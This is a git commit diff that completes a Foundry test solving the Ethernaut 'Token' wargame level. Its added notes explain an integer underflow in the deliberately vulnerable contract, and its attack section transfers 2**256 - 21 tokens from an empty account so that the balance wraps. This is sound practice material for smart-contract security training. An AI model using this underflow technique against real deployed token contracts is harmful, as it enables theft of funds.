d17315a29f22703adbf8d7faa28e352334617f1c
Craigson <craigpick@gmail.com>
2022-08-27 09:58:14 -0400

    complete 05_Token

--- ethernaut-x-foundry/src/test/05_Token.t.sol
+++ ethernaut-x-foundry/src/test/05_Token.t.sol
@@ -1,9 +1,21 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
 import "../Token/TokenFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
+
+/*
+    Solution notes:
+    - Because the contract version changed to 0.8.10, they had to add `unchecked` which
+    is a bit of a giveaway that over/underflow is involved
+    - The "odometer" hint probably means that once an odomoter reachs it's max value, eg. 9999
+    it will tick over to 0000.
+    - the require `>= 0` allows an account with a balance of 0 to transfer funds, and the lack of underflow
+    check doesnt prevent the transfer from happening
+
+*/
 
 contract TokenHack is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
@@ -28,19 +40,29 @@ contract TokenHack is DSTest {
 
         // start pranking the user
         vm.startPrank(eoaAddress);
-
         // instantiate the level
         address levelAddress = ethernaut.createLevelInstance(tokenFactory);
         Token ethernaughtToken = Token(payable(levelAddress));
+        vm.stopPrank();
 
         // =========================  ATTACK
+        address otherUser = address(5);
+        vm.startPrank(otherUser);
+        // we had 20 tokens to start with, so subtract 21 to prevent overflow
+        ethernaughtToken.transfer(eoaAddress, 2**256 - 21);
+        vm.stopPrank();
+        emit log_named_uint(
+            "balance: :",
+            ethernaughtToken.balanceOf(eoaAddress)
+        );
 
         // ========================= SUBMISSION
 
-        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-        //     payable(levelAddress)
-        // );
+        vm.startPrank(eoaAddress);
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
